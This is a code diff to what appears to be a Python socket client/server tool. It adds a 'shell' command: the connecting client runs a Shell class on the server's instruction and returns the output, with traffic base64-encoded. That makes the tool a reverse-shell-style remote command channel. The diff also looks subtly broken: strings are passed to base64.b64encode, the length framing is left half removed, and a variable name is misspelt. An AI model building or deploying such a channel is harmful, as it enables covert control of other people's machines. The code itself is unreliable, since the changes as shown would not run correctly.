@@ -4,39 +4,36 @@ import subprocess
 import os
 import base64
 import time
+from .Shell import Shell
 
 class Helper:
     def __init__(self, conn):
-        self.header = 64
+        self.header = 10240
         self.formate = 'utf-8'
         self.conn = conn
 
     def encode(self, message):
-        return message.encode(self.formate)
+        return base64.b64encode(message)
+
 
     def decode(self, message):
-        return message.decode(self.formate)
+        return base64.b64decode(message).decode(self.formate, errors='ignore')
 
     def message(self, message):
         message = self.encode(message)
-        msg_length = len(message)
-        send_length = self.encode(str(msg_length))
-        send_length += b' ' * (self.header - len(send_length))
-         
-        return {
-            "length": send_length,
-            "text": message
-        }
+        return message
 
     def send(self, message):
         message = self.message(message)
-        self.conn.send(message['length'])
-        self.conn.send(message['text'])
+        self.conn.send(message)
 
     def msg_length(self):
         message_length = self.receive().strip()
         if message_length:
-            return int(message_length)
+            try:
+                return int(message_length)
+            except (ValueError, TypeError):
+                return None
         return None
 
     def receive(self, length=64):
@@ -74,15 +71,18 @@ class Server():
         while connected:
             helper = Helper(conn)
 
-            length = helper.msg_length()
-            o = helper.receive(length)
+            o = helper.receive(self.header)
             if o == "exit":
                 connected = False
                 break
-             
-            print(f"[Client] {addr}: {o}")
-            cmd = input("[Server]?>: ").strip()
-            helper.send(cmd)
+            elif o == "shell":
+                print(f"[Client] {addr}: {o}")
+                cmd = input(f"[Server][{addr}][shell]?>: ").strip()
+                helper.send(cmd)
+            else:
+                print(f"[Client] {addr}: {o}")
+                cmd = input(f"[Server][{addr}]?>: ").strip()
+                helper.send(cmd)
         conn.close()
 
 
@@ -94,7 +94,7 @@ class Client():
         self.host = host
         self.port = port
         self.hostname = socket.gethostname()
-        self.header = 64
+        self.header = 10240
         self.formate = 'utf-8'
 
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -114,11 +114,14 @@ class Client():
             try:
                 # Receive response from server
                 helper = Helper(self.client)
-                length = helper.msg_length()
-                cmd = helper.receive(length)
+                cmd = helper.receive(self.header)
                 if not cmd or cmd == "exit":
                     helper.send("exit")
                     break
+                elif cmd == "shell":
+                    shell = Shell(cmd)
+                    ouput = shell.run()
+                    helper.send(ouput)
                     
                 print(f"[server] {self.hostname}: {cmd}")
                 
